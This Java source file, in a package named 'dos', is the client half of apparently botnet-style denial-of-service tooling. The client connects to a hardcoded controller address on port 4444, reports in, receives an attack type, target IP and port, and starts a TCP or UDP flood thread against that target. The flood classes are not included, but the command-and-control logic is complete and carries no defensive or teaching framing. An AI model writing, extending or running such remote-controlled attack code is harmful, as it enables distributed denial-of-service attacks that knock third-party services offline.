package dos;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

public class Client {

    private Socket socket;

    public Client() {
        try {
            socket = new Socket("10.100.93.222", 4444);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
    
    public void doAction() {
        try {
            if (socket.isConnected()) {
                ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                Message m = new Message();
                m.setMessage("I am connecting");                
                oos.writeObject(m);
                oos.flush();
                //oos.close();

                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                Object o = ois.readObject();
                m = (Message) o;

                if (m.getAttack_type().equalsIgnoreCase("TCP")) {
                    new Thread(new TCP_DOS(m.getIp(),m.getPort())).start();
                }
                else if(m.getAttack_type().equalsIgnoreCase("UDP"))
                {
                    new Thread(new UDP_DOS(m.getIp(), m.getPort())).start();
                }                    

                System.out.println(m.getMessage());


               // ois.close();
               // oos.close();

            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
